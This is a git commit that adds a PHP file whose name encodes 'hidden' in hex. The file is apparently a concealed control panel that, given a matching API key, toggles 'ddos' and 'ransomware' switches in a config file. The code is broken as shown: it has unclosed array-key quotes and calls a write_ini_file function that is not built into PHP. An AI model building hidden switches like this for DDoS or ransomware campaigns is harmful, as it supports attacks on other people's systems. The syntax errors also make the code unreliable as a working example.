c6aaaf16b0cc502f70c221a84aad4d6e0fb71079
wotwot <r.vanvliet@student.fontys.nl>
2020-12-15 12:58:06 +0100

    Create controlpanel_68696464656e.php

---
+++ controlpanel_68696464656e.php
@@ -0,0 +1,27 @@
+<?php
+
+$config = parse_ini_file('config.ini', true);
+
+
+if(isset($_POST['api']) && $_POST['api'] == $config['main']['api'])
+{
+     if(isset($_POST['ddos'])){
+      if ($config['main]['ddos'] == "off"){
+        $config['main]['ddos'] = "on";
+      }else{
+        $config['main]['ddos'] = "off";
+      }
+     }
+     if(isset($_POST['ransomware'])){
+      if ($config['main]['ransomware'] == "off"){
+        $config['main]['ransomware'] = "on";
+      }else{
+        $config['main]['ransomware'] = "off";
+      }
+     }
+}
+
+write_ini_file('config.ini', $config);
+
+
+?>
